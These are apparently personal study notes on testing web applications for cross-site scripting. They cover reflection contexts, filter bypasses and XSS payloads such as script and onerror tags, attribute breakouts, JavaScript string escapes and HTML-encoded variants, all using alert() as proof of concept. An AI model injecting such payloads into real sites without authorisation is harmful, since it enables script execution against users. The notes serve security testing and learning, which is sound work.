# Advices for testing xss
* Submit random alphanumeric values. For each entry point, submit a unique random value and determine whether the value is 
reflected in the response
* Test seperatly every entry point: includes also headers, urls, etc.
* Determine the reflection context. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc => check contexts: https://portswigger.net/web-security/cross-site-scripting/contexts also use to copy tags: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* Test a candidate payload: based on the context of reflection test the field with f.e. burp repeater
* If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads

# test contexts
## XSS between HTML tags
you need to introduce some new HTML tags designed to trigger execution of JavaScript.
Some useful ways of executing JavaScript are:
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

* you might notice that tags are being blocked by firewall, you can interate all tags to see which are allowed.

## XSS in HTML tag attributes
XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

"><script>alert('hi')</script> 
OR
" autofocus onfocus=alert(document.domain) x="

<a href="javascript:alert(document.domain)"> 

## XSS into JavaScript
* Breaking out of JS: </script><img src=1 onerror=alert(document.domain)>  or with alert(1)
* Breaking out of a JavaScript string: `'-alert(document.domain)-'` OR `';alert(document.domain)//`
* in case application is escaping `'` => might help: `\';alert(document.domain)//`

## Making use of HTML-encoding
out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters. 

* <a href="#" onclick="... var input='controllable data here'; ..."> 
* we can use it to break out of js via encoding with: &apos;-alert(document.domain)-&apos;

## XSS in JavaScript template literals
For example, if the XSS context is as follows:

<script>
...
var input = `controllable data here`;
...
</script> 

exploit: `${alert(document.domain)}`

# types
## Reflected
is withing a payload or url
## Stored
Really stored on a page
## Dom
Within javascript